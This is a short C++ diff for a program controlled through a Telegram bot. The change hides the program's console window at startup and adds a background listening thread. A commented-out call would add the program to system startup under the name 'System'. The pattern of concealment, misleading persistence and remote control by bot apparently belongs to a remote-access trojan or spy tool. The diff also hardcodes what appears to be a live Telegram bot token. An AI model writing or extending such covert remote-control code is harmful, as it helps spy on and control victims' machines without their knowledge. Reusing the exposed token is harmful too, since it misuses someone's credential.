@@ -188,6 +188,9 @@ void startBot(std::string token)
 		if (currentMode == MODE_STANDARD)
 		{
 			ShowConsole();
+			isConversationRunning = true;
+			thread listenThread(listenMode, ref(bot), message->chat->id);
+			listenThread.detach();
 			currentMode = MODE_CONVERSATION;
 		}
 		else
@@ -202,8 +205,8 @@ void startBot(std::string token)
 		if (message->text == "/exit_mode") {
 			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
 			currentMode = MODE_STANDARD;
-			//HideConsole();
-			conversationMode = "speak";
+			HideConsole();
+			isConversationRunning = false;
 			return;
 		}
 
@@ -251,11 +254,10 @@ void startBot(std::string token)
 
 int main()
 {
-	// Hiding the console
-	//HideConsole();
+	HideConsole();
 
 	//AddToStartup(L"System", L"path\\to\\your\\program.exe");
 
-	startBot("TOKEN");
+	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");
 	return 0;
 }
